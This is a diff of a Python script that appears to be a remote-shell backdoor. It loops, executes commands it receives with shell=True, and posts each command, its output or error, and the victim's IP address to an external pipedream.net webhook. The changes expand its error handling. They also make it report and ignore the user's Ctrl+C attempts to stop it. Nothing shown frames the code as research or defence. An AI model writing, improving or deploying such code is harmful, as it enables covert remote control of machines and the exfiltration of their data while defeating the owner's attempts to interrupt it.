@@ -62,19 +62,60 @@ while True:
                         print("Failed to connect to server")
                         continue
 
-                cmdout = system(command, shell=True).decode()
-                if cmdout != "":
+                try:
+                    cmdout = system(command, shell=True).decode()
+                except subprocess.CalledProcessError as e:
                     try:
-                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```- {ip}")
+                        global sperror
+                        sperror=True
+                    except KeyboardInterrupt:
+                        continue
+                    try:
+                        if e.output != "":
+                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```Error: {e.output} exited with code {e.returncode}```- {ip}")
+                        else:
+                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```Error: exited with no output and code {e.returncode}```- {ip}")
                     except KeyboardInterrupt:
                         try:
-                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post (error)output``")
                         except KeyboardInterrupt:
                                 continue
                         continue
                     except:
-                        print("Failed to sent output")
+                        print("Failed to sent (error)output")
                         continue
+                except KeyboardInterrupt:
+                    try:
+                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to execute command``")
+                    except KeyboardInterrupt:
+                            continue
+                    continue
+
+                if not sperror:
+                    if cmdout != "":
+                        try:
+                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```- {ip}")
+                        except KeyboardInterrupt:
+                            try:
+                                post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+                            except KeyboardInterrupt:
+                                    continue
+                            continue
+                        except:
+                            print("Failed to sent output")
+                            continue
+                    else:
+                        try:
+                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```Command Executed successfully without output```- {ip}")
+                        except KeyboardInterrupt:
+                            try:
+                                post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
+                            except KeyboardInterrupt:
+                                    continue
+                            continue
+                        except:
+                            print("Failed to sent output")
+                            continue
                 old_command = command
                 continue
             except:
